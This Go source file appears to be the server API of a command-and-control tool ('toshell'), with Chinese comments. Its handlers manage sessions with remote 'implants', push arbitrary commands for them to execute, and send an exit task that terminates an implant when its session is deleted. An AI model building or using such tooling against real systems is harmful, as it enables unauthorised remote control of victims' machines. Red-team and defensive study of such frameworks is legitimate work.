package api

import (
	"encoding/json"
	"io"
	"net/http"

	"github.com/gorilla/mux"
	"toshell/internal/server/logging"
	"toshell/internal/server/task"
)

func (s *Server) listSessionsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	sessions := s.sessionMgr.ListInfo()
	json.NewEncoder(w).Encode(map[string]interface{}{
		"sessions": sessions,
		"count":    len(sessions),
	})
}

func (s *Server) getSessionHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	session, err := s.sessionMgr.Get(id)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusNotFound)
		return
	}

	json.NewEncoder(w).Encode(session.Info)
}

func (s *Server) updateSessionHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, `{"error":"Failed to read request body"}`, http.StatusBadRequest)
		return
	}

	var payload struct {
		Comment string `json:"comment"`
	}

	if err := json.Unmarshal(body, &payload); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}

	if err := s.sessionMgr.UpdateComment(id, payload.Comment); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusNotFound)
		return
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"message": "Session updated",
		"comment": payload.Comment,
	})
}

func (s *Server) deleteSessionHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	// 删除前先确认会话存在，避免对不存在的会话做多余操作
	if _, err := s.sessionMgr.Get(id); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusNotFound)
		return
	}

	// 删除主机 = 植入端停止运行：先推送"退出"任务，植入端收到后退出进程。
	// 推送失败（会话已离线等）不阻塞删除，仅记录日志。
	if s.listener != nil && s.taskMgr != nil {
		exitTask, err := s.taskMgr.CreateExit(id)
		if err == nil {
			if err := s.listener.PushTask(id, exitTask); err != nil {
				logging.Info("api", "Delete session %s: failed to push exit task: %v", id, err)
			} else {
				logging.Info("api", "Delete session %s: exit task %d pushed, implant will terminate", id, exitTask.ID)
			}
		}
	}

	if err := s.sessionMgr.Remove(id); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	json.NewEncoder(w).Encode(map[string]string{"message": "Session deleted"})
}

func (s *Server) interactSessionHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	id := vars["id"]

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, `{"error":"Failed to read request body"}`, http.StatusBadRequest)
		return
	}

	var payload struct {
		Command     string   `json:"command"`
		Args        []string `json:"args"`
		ExecuteType string   `json:"execute_type"`
		Timeout     uint32   `json:"timeout"`
		TaskType    string   `json:"task_type"`
	}

	if err := json.Unmarshal(body, &payload); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}

	_, err = s.sessionMgr.Get(id)
	if err != nil {
		http.Error(w, `{"error":"Session not found"}`, http.StatusNotFound)
		return
	}

	taskParams := task.TaskParams{
		Command:     payload.Command,
		Args:        payload.Args,
		ExecuteType: payload.ExecuteType,
		Timeout:     payload.Timeout,
		TaskType:    payload.TaskType,
	}
	if taskParams.TaskType == "" {
		taskParams.TaskType = task.TaskTypeCommand
	}

	taskInfo, err := s.taskMgr.Create(id, taskParams)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	if s.listener != nil {
		if err := s.listener.PushTask(id, taskInfo); err != nil {
			logging.Error("api", "Failed to push task: %v", err)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"task_id":   taskInfo.ID,
				"task_type": taskInfo.TaskType,
				"message":   "Task created but delivery pending: " + err.Error(),
			})
			return
		}
		logging.Info("api", "Task %d pushed to session %s: %s (type: %s)", taskInfo.ID, id, payload.Command, taskParams.TaskType)
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"message":   "Task pushed",
	})
}
